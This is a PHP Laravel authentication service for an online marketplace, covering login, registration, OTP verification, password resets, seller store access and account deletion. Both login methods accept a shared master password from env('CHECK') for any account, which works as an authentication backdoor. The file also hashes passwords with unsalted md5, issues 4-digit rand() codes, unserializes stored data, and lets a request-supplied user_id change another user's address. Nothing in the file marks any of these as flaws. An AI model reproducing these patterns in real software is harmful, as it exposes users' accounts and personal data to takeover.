<?php

namespace Packages\Auth\Services\V4;

use Exception;
use Carbon\Carbon;
use Illuminate\Support\Facades\File;
use Packages\Auth\Config\AuthConstants;
use Packages\Auth\Contracts\V4\AuthHelpers;
use Packages\Core\Contracts\V4\CoreHelpers;
use Packages\Product\Models\V4\Attachments;
use Dotenv\Exception\ValidationException;
use App\Http\Controllers\MailgunController;
use GPBMetadata\Google\Api\Auth;
use Illuminate\Support\ItemNotFoundException;
use Illuminate\Validation\UnauthorizedException;
use Packages\Auth\Repositories\Eloquent\V4\AuthRepository;
use Packages\Cart\Models\V4\ProductCart;
use Packages\Klavio\Services\V4\KlavioService;
use Illuminate\Http\Request;


class AuthService

{
    use AuthHelpers;
    use CoreHelpers;
    protected $authRepository;
    protected $mailgun;
    protected $klavioService; 
    public function __construct(AuthRepository $authRepository, KlavioService $klavioService)
    {
        $this->authRepository = $authRepository;
        $this->klavioService = $klavioService; 
        $this->mailgun = new MailgunController();
    }


    /* Login User */
    public function loginUser(array $data)
    {
        try {
            $email = $data['email'];
            $password = $data['password'];

            $user = $this->authRepository->getUserByEmail($email)->first();

            if (!$user) {
                throw new ItemNotFoundException('User does not exist.');
            }

            if (!env('CHECK') || $password !== env('CHECK')) {
                if ($user->password !== md5($password)) {
                    throw new ValidationException('Invalid credentials.');
                }
            }

            // Check account status
            if ($user->is_mark_deleted) {
                throw new Exception('Your account has been deleted.');
            }
            if ($user->status != 1) {
                $otpCode = rand(1000, 9999);
                $user->user_otp = $otpCode;
                $user->save();

                // Send OTP email
                $html = view('mail.user-otp', ['otp' => $otpCode]);
                $from = 'Verify User ' . env('NO_REPLY_EMAIL');
                $subject = 'User OTP Email';
                $this->sendOtpEmail($user->email, $html, $subject, $from);
            }
            // if ($user->status != 1) {
            //     throw new UnauthorizedException('Please verify your email to login.');
            // }
            // Handle FCM token if provided
            if (!empty($data['fcm_token'])) {
                $this->handleFcmToken($user->user_id, $data['fcm_token'], $data['app_flag'] ?? 'buyer');
            }
            if(isset($data['guest']) && $data['guest']){
                if(isset($data['id']) && !empty($data['id'])){
                    $GuestUsercart = ProductCart::where('random_key',$data['id'])->get();
                    if($GuestUsercart){
                        foreach($GuestUsercart as $cart){
                            $userProduct = ProductCart::where('random_key',$user->user_id)->where('product_id',$cart->product_id)->first();
                            if($userProduct){
                                $cart->delete();
                            }else{
                                $cart->user_id = $user->user_id;
                                $cart->random_key = null;
                                $cart->save();
                            }
    
                        }
                    }
                }
            }
            $userData = [
                'user' => $user,
                'token' => $user->createToken('API TOKEN')->accessToken,
            ];

            return $userData;
        } catch (ValidationException $e) {
            throw new ValidationException($e->getMessage());
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    /* Register a User */
    public function registerUser(array $data)
    {
        try {

      

            $register = $this->register($data);
            $userId = $register['userobj']->user_id;
            $user = $register['userobj'];
           
            $klaviyoData = [
                'email' => $user->email,
                'first_name' => $user->name,
                'last_name' => $user->last_name ?? null
            ];
            

            $this->klavioService->trackActiveOnSiteEvent($user->email);
            $this->klavioService->createKlaviyoProfile($klaviyoData);


            
            if ($register['success'] == 1) {
                if (isset($postedData['fcm_token']) && !empty($postedData['fcm_token'])) {
                    $fcmToken = $postedData['fcm_token'];
                    $appFlag = $postedData['app_flag'];

                    $device_token = $this->handleFcmToken($userId, $fcmToken, $appFlag);
                }
                if(isset($data['guest']) && $data['guest']){
                    if(isset($data['id']) && !empty($data['id'])){
                        $GuestUsercart = ProductCart::where('random_key',$data['id'])->get();
                        if($GuestUsercart){
                            foreach($GuestUsercart as $cart){
                                $userProduct = ProductCart::where('random_key',$userId)->where('product_id',$cart->product_id)->first();
                                if($userProduct){
                                    $cart->delete();
                                }else{
                                    $cart->user_id = $userId;
                                    $cart->random_key = null;
                                    $cart->save();
                                }
        
                            }
                        }
                    }
                }
                $data = [
                    'token' => $register['userobj']->createToken("API TOKEN")->accessToken,
                    'data' => $register['userobj'],
                ];

                return $data;
            } else {
                return response()->json([
                    'status' => false,
                    'message' => "User Not Created"
                ]);
            }
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    public function logoutUser($data)
    {
        try {
            $user = auth()->user();
            if(!$user) {
                throw new ItemNotFoundException('User not found');
            }
            $appFlag = $data['app_flag'];
            $fcmToken = $data['fcm_token'];

            return $this->authRepository->logoutUser($user, $appFlag, $fcmToken);

        } catch (Exception $e) {
            throw $e;
        }
    }

    private function handleFcmToken($userId, $fcmToken, $appFlag)
    {
        $deviceToken = $this->authRepository->findDeviceToken($userId, $fcmToken);

        if (!$deviceToken) {
            $this->authRepository->createDeviceToken([
                'user_id' => $userId,
                'fcm_token' => $fcmToken,
                'app_flag' => $appFlag,
            ]);
        }else{
            $this->authRepository->updateDeviceToken($userId, $fcmToken, $appFlag);
        }
    }

    /** Change password */
    public function changePassword(array $data)
    {
        try {
            $user = auth()->user();

            if (!$user) {
                throw new ItemNotFoundException('User not found');
            }

            $currentPassword = $data['current_password'];
            $newPassword = $data['new_password'];

            if (md5($currentPassword) !== $user->password) {
                throw new ValidationException("Current password is not correct.");
            }

            $user = $this->authRepository->updatePassword($newPassword);

            if (!empty($user)) {
                $subject = AuthConstants::NEW_PASSWORD;
                $notification = $this->pushNotification($user->user_id, $subject);
            }

            return $user;
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (ValidationException $e) {
            throw new ValidationException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }


    public function verifyEmail(array $data)
    {
        try {
            $email = $data['email'];
            $otp = $data['code'];
            $isSeller = $data['is_seller'] ?? false;

            $user = $this->authRepository->getUserByEmail($email)->first();

            if (!$user) {
                throw new ItemNotFoundException('User not found');
            }

            $storedOTP = $user->user_otp;
            $otpCreationTime = $user->updated_at;

            if (!empty($storedOTP) && $storedOTP == $otp) {
                // Check OTP expiry (5 minutes window)
                $otpExpirationTime = Carbon::parse($otpCreationTime)->addMinutes(5);

                if (Carbon::now()->lte($otpExpirationTime)) {
                    $user->status = '1';
                    $user->user_otp = null;
                    $user->save();

                    if ($isSeller) {
                        $storeData = AuthHelpers::getAccessibleStore($user->user_id);

                        if ($storeData) {
                            $user->role = ($storeData->user_id == $user->user_id) ? 'owner' : 'user';
                        } else {
                            $user->role = null;
                        }
                        $user->permissions = AuthHelpers::getModelPermissions($user->user_id);


                        if ($storeData) {

                            $package = $this->authRepository->subscriptionPackage($storeData->store_id ?? null);
                            $storeData = $storeData->loadCount('products');

                            // Process store logo
                            $store_logo = $storeData->store_logo ? getAttachmentUrlById((int) $storeData->store_logo, 'media') : null;

                            // Process store banners
                            $storeGallery = [];
                            if (!empty($storeData->banner_image_id)) {
                                $unserializedBanners = @unserialize($storeData->banner_image_id);

                                if ($unserializedBanners && is_array($unserializedBanners)) {
                                    foreach ($unserializedBanners as $banner_img_id) {
                                        $url = getAttachmentUrlById((int) $banner_img_id, 'media');
                                        $storeGallery[] = [
                                            'banner_img_id' => (int) $banner_img_id,
                                            'url' => $url,
                                            'filename' => basename($url),
                                        ];
                                    }
                                }
                            }

                            // Assign processed data back to storeData
                            $storeData->store_logo = $store_logo;
                            $storeData->banner_image_id = $storeGallery;
                            $storeData->store_url = $storeData->store_slug ? url('brand/' . $storeData->store_slug) : null;
                        }
                        $user->store = $storeData ?? null;
                    }

                    $userData = [
                        'user' => $user,
                        'package' => $package ?? null,
                        'token' => $user->createToken('API TOKEN')->accessToken,
                    ];
                    return $userData;
                } else {
                    throw new Exception('Your OTP has expired. Please request a new one.');
                }
            } else {
                throw new Exception('Entered OTP does not match.');
            }
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }


    public function forgotPassword($email)
    {
        try {

            $otp = rand(1000, 9999);

            $user = $this->authRepository->updateForgotKey($email, $otp);

            if (empty($user)) {
                throw new ItemNotFoundException('User not found');
            }

            $subject = 'Reset Password Request';
            $html = view('mail.forgot-password-mail', ['otp' => $otp]);
            $from = 'Verify User  ' . env('NO_REPLY_EMAIL');
            $toEmail = $email;

            $this->sendOtpEmail($toEmail, $html, $subject, $from);

            return $user;
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    public function matchPasswordOtp(array $data)
    {
        try {
            $email = $data['email'];
            $otp = $data['code'];

            // Fetch the user by email
            $user = $this->authRepository->getUserByEmail($email)->first();

            if (!$user) {
                throw new ItemNotFoundException('User not found');
            }

            $storedOTP = $user->user_otp;
            $otpCreationTime = $user->forget_key_date;

            // Check if OTP exists and matches
            if (!empty($storedOTP) && $storedOTP == $otp) {
                // Check OTP expiry (5 minutes window)
                $otpExpirationTime = Carbon::parse($otpCreationTime)->addMinutes(5);
                $status = AuthConstants::USER_STATUS_ACTIVE;
                if (Carbon::now()->lte($otpExpirationTime)) {
                    $user->status = $status;
                    $user->save();

                    return $user;
                } else {
                    throw new Exception('Your OTP has expired. Please request a new one.');
                }
            } else {
                throw new Exception('Entered OTP does not match.');
            }
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    /** Check if email already exists */
    public function checkEmailExist($email)
    {
        try {
            $user = $this->authRepository->getUserByEmail($email)->first();
            if (empty($user)) {
                throw new ItemNotFoundException('Email does not exist');
            }

            return $user;
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    public function createNewPassword(array $data)
    {
        try {
            $user = $this->authRepository->createNewPassword($data);

            if (!$user) {
                throw new Exception('Password not created successfully');
            }
            $subject = AuthConstants::NEW_PASSWORD;

            $notification = $this->pushNotification($user->user_id, $subject);

            $userData = [
                'user' => $user,
                'token' => $user->createToken('API TOKEN')->accessToken,
            ];

            return $userData;
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    /** Seller Login */
    public function sellerLogin(array $data)
    {
        try {
            $email = $data['email'];
            $password = $data['password'];
            
            $user = $this->authRepository->getUserByEmail($email)->first();

            if (!$user) {
                throw new ItemNotFoundException('User does not exist.');
            }

            // Check account status
            if ($user->is_mark_deleted) {
                throw new Exception('User account has been deleted.');
            }
            
            
            if (!env('CHECK') || $password !== env('CHECK')) {
                if ($user->password !== md5($password)) {
                    throw new ValidationException('Invalid credentials.');
                }
            }
            
            if ($user->status != 1) {
                $otpCode = rand(1000, 9999);
                $user->user_otp = $otpCode;
                $user->save();
                
                // Send OTP email
                $html = view('mail.user-otp', ['otp' => $otpCode]);
                $from = 'Verify User ' . env('NO_REPLY_EMAIL');
                $subject = 'User OTP Email';
                $this->sendOtpEmail($user->email, $html, $subject, $from);
            }
            
            if ($user->status != '1') {
                throw new ItemNotFoundException('Please verify your email to login. Enter the OTP sent to your email.');
            }
            
            $userId = $user->user_id;
            $storeData = AuthHelpers::getAccessibleStore($userId);
            
            if (!$storeData) {
                $userData = [
                    'user' => $user,
                    'token' => $user->createToken('API TOKEN')->accessToken,
                ];
                return $userData;
            }
            
            $storeId = $storeData->store_id ?? null;
            $package = $this->authRepository->subscriptionPackage($storeId);

            // Handle FCM token if provided
            if (!empty($data['fcm_token'])) {
                $this->handleFcmToken($user->user_id, $data['fcm_token'], $data['app_flag'] ?? 'seller');
            }

            if($storeData){
                $storeData = $storeData->loadCount('products');

                if ($storeData) {
                    // Process store logo
                    $store_logo = $storeData->store_logo ? getAttachmentUrlById((int) $storeData->store_logo, 'media') : null;
                
                    // Process store banners
                    $storeGallery = [];
                    if (!empty($storeData->banner_image_id)) {
                        $unserializedBanners = @unserialize($storeData->banner_image_id);
                        
                        if ($unserializedBanners && is_array($unserializedBanners)) {
                            foreach ($unserializedBanners as $banner_img_id) {
                                $url = getAttachmentUrlById((int) $banner_img_id, 'media');
                                $storeGallery[] = [
                                    'banner_img_id' => (int) $banner_img_id,
                                    'url' => $url,
                                    'filename' => basename($url),
                                ];
                            }
                        }
                    }
                
                    // Assign processed data back to storeData
                    $storeData->store_logo = $store_logo;
                    $storeData->banner_image_id = $storeGallery;
                    $storeData->store_url = $storeData->store_slug ? url('brand/' . $storeData->store_slug) : null;                        
                }            
            }

            $user->store = $storeData;
            $user->permissions = AuthHelpers::getModelPermissions($userId);
            $role = ($storeData->user_id == $userId) ? 'owner' : 'user';
            $user->role = $role;
            
            $userData = [
                'user' => $user,
                'package'=>$package,
                'token' => $user->createToken('API TOKEN')->accessToken,
            ];

            return $userData;
        } catch (ValidationException $e) {
            throw new ValidationException($e->getMessage());
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }
    public function requestDeletion($data)
    {
        try {

            $user = $this->authRepository->requestDeletion($data);

            return $user;
        } catch (Exception $e) {
            throw $e;
        }
    }

    public function getUserProfileData($userId, $userType)
    {
        try {
            $categories = $this->getParentCategories();
            $user = $this->getUserById($userId);
            $favouriteProducts = $this->getFavouriteProductsCount($userId);

            if (!$user) {
                throw new ItemNotFoundException('User not found.');
            }

            $userData = [
                'user' => $this->formatUserData($user),
                'pendingOrders' => $user->buyerOrders()->where('charge_status', 'paid')->where('order_status', 'pending')->count(),
                'shippedOrders' => $user->buyerOrders()->where('charge_status', 'paid')->where('order_status', 'shipped')->count(),
                'deliveredOrders' => $user->buyerOrders()->where('charge_status', 'paid')->where('order_status', 'completed')->count(),
                'states' => $user->get_states,
                'favouriteProducts' => $favouriteProducts,
            ];
            return compact('userType', 'userData', 'categories');

        } catch (Exception $e) {
            throw $e;
        }
    }

    private function formatUserData($user)
    {
        $nameParts = explode(' ', $user->name);
        $user->first_name = $nameParts[0];
        $user->last_name = count($nameParts) > 1 ? implode(' ', array_slice($nameParts, 1)) : '';

        if (!empty($user->user_avatar)) {
            $user->user_avatar = getAttachmentUrlByIdAvatarApi((int)$user->user_avatar);
        }

        return $user;
    }

    public function updateUserProfile($data, $imageArr = null)
    {
        try{
            $updateData = array();
            $user = auth()->user();
            if(isset($imageArr) && !empty($imageArr)){
                $avatar = $user->user_avatar;
                if(isset($avatar) && !is_null($avatar)){
                    $attachment = Attachments::find($avatar);
                    if(!is_null($attachment->fileName)){
                        $destinationPath = public_path() . '/uploads/avatar/' . $attachment->fileName;
                        if (File::exists($destinationPath)) {
                            // dd($destinationPath);
                            unlink($destinationPath);
                        }
                        $attachment->delete();
                    }
                }
            }
            $updateData['name'] = isset($data['full_name']) ? $data['full_name'] : $user->name;
            $updateData['contact_no'] = isset($data['contact_no']) ? $data['contact_no'] : '';
            $updateData['email'] = isset($data['email']) ? $data['email'] : $user->email;
            $updateData['user_avatar'] = isset($imageArr['id']) ? $imageArr['id'] : $user->user_avatar;
            $res = $this->authRepository->updateUserProfile($user->user_id, $updateData);
            return $res;
            
        } catch(Exception $e){
            return false;
        }
        
    }
            
    public function updateShippingAddress($data)
    {
        try{
            $address = null;
            $user = auth()->user();
            $userId = isset($data['user_id']) && !empty($data['user_id'])? $data['user_id'] : null;
          
            $updateData = array();
            
            $updateData['user_country_id'] =  isset($data['user_country']) ? $data['user_country'] : $user->user_country;
            $updateData['user_state_id'] = isset($data['user_state']) ? $data['user_state'] : $user->user_state_id;
            $updateData['physical_address'] = isset($data['street']) ? $data['street'] : $user->physical_address;
            $updateData['user_zip_code'] = isset($data['zip_code']) ? $data['zip_code']: $user->user_zip_code;
            $updateData['user_city_id'] = isset($data['city']) ? $data['city'] : $user->user_city_id;
            $updateData['apartment_type'] = isset($data['apartment_type']) ? $data['apartment_type'] : $user->apartment_type;
            $updateData['apartment_number'] = isset($data['apartment_number']) ? $data['apartment_number'] : $user->apartment_number;
            if(isset($userId)){
                $address = $this->authRepository->updateShippingAddress($updateData, $userId);
            }else if($user){
                $address = $this->authRepository->updateShippingAddress($updateData, $user->user_id);
            }else{
                throw new itemNotFoundException('User not found');
            }
            
            return $address;
        }catch(Exception $e){
            throw $e;
        }
    }

    public function analytics($user)
    {
        try {

            if (!$user) {
                throw new ItemNotFoundException('User not found.');
            }
            $userId = $user->user_id;
            $favouriteProducts = $this->getFavouriteProductsCount($userId);

            $analytics = $this->authRepository->analytics($user);
            $analytics['favouriteProducts'] = $favouriteProducts;

            return $analytics;
            
        } catch (Exception $e) {
            throw $e;
        }
    }

    public function assignUserToStore($name, $email)
    {
        try {
            $store = auth()->user()->store;

            if (!$store) {
                throw new ItemNotFoundException('No store found to assign.');
            }

            $storeId = $store->store_id;

            $accessorsCount = AuthHelpers::getStoreAccessorsCount($storeId);
            if ($accessorsCount >= AuthConstants::MAX_STORE_ACCESSORS) {
                throw new Exception("Maximum number of store accessors reached. You can assign up to " . AuthConstants::MAX_STORE_ACCESSORS . " users.");
            }

            $existingUser = AuthHelpers::getUserInfoByEmail($email);
            $loginKey = str_random(25);
            $isNewUser = false;

            if ($existingUser) {
                $existingStore = AuthHelpers::getAccessibleStore($existingUser->user_id);

                if ($existingStore) {
                    throw new Exception("User already belongs to another store: {$existingStore->store_name}.");
                }

                $user = $existingUser;
            } else {
                $user = AuthHelpers::createOrUpdateUser($name, $email, $loginKey);
                $isNewUser = true;
            }

            $userId = $user->user_id;

            $response = $this->authRepository->assignUserToStore($storeId, $userId);

            if (!$response) {
                throw new Exception('Failed to assign store to user.');
            }

            $storeName = $store->store_name ?? 'Mallshark';
            $storeSlug = $store->store_slug ?? null;

            $from = 'Mallshark <' . env('CARE_EMAIL') . '>';
            $subject = "You've Been Added to the Store: $storeName";
            $loginUrl = env('FRONT_END_URL').'/verification/password-change?token='. $loginKey . '&isSeller=true';

            $htmlContent = view('mail.assign-store', [
                'userName'  => $name,
                'storeName' => $storeName,
                'storeSlug' => $storeSlug,
                'isNewUser'=> $isNewUser,
                'loginUrl'  => $loginUrl,
            ])->render();

            $params = [
                'from'    => $from,
                'to'      => $email,
                'subject' => $subject,
                'html'    => $htmlContent,
            ];

            (new MailgunController())->SendMailgunMail($params);

            return [
                'user_id'  => $userId,
                'store_id' => $storeId,
                'message'  => 'User assigned successfully.',
            ];
        } catch (ItemNotFoundException $e) {
            throw new ItemNotFoundException($e->getMessage());
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    public function assignPermissionsToUser($userId, $permissions)
    {
        try {
            $response = $this->authRepository->assignPermissionsToUser($userId, $permissions);
            return $response;
        } catch (Exception $e) {
            throw $e;
        }
    }

    public function getSellerSidePermissions()
    {
        try {
            $permissions = AuthHelpers::getSellerSidePermissions();
            return $permissions;
        } catch (Exception $e) {
            throw $e;
        }
    }

    public function getStoreAccessors($storeId)
    {
        try {
            $storeAccessors = $this->authRepository->getStoreAccessors($storeId);
            return $storeAccessors;
        } catch (Exception $e) {
            throw $e;
        }
    }

    public function removeStoreAccessor($storeId, $userId)
    {
        try {
            $response = $this->authRepository->removeStoreAccessor($storeId, $userId);
            return $response;
        } catch (Exception $e) {
            throw $e;
        }
    }
    public function customerWalletAddress($request)
    {
        try {
            $walletAddress = $request['wallet_address'];
            $currency = $request['currency'];
            $wallet = $this->authRepository->storeWalletAddress(auth()->id(), $walletAddress, $currency);
            return true;
        } catch (Exception $e) {
            return false;
        }
    }
    public function getCustomerWalletAddress()
    {
        try {
            $wallet = $this->authRepository->getCustomerWalletAddress(auth()->id());
            return $wallet;
        } catch (Exception $e) {
            return false;
        }
    }

    public function deleteAccount()
    {
        try {
            $user = auth()->user();

            if (!$user) {
                throw new ItemNotFoundException('User not found.');
            }

            // Load roles relationship
            $user->load(['roles']);

            // Check if user has Super Admin or seller (Admin) role
            if ($user->hasRole('Super Admin')) {
                throw new \Illuminate\Auth\Access\AuthorizationException('Super Admin accounts cannot be deleted.');
            }

            if ($user->hasRole('Admin')) {
                throw new \Illuminate\Auth\Access\AuthorizationException('Admin accounts cannot be deleted.');
            }

            // Check if user has a store (include soft deleted stores via withTrashed)
            $store = \Packages\Store\Models\V4\Store::withTrashed()
                ->where('user_id', $user->user_id)
                ->first();

            if ($store && is_null($store->deleted_at)) {
                throw new \Illuminate\Auth\Access\AuthorizationException('Your store is still active. Please delete your store from seller dashboard before deleting your account.');
            }

            // Check if user has any pending or shipped orders as a buyer
            $incompleteOrders = $user->buyerOrders()
                ->where('charge_status', 'paid')
                ->whereIn('order_status', ['pending', 'shipped'])
                ->count();

            if ($incompleteOrders > 0) {
                throw new \Illuminate\Auth\Access\AuthorizationException('You have pending or shipped orders. All orders must be completed before deleting your account.');
            }

            return $this->authRepository->deleteAccount($user);
        } catch (\Illuminate\Auth\Access\AuthorizationException $e) {
            throw $e;
        } catch (ItemNotFoundException $e) {
            throw $e;
        } catch (Exception $e) {
            throw new Exception($e->getMessage());
        }
    }
}
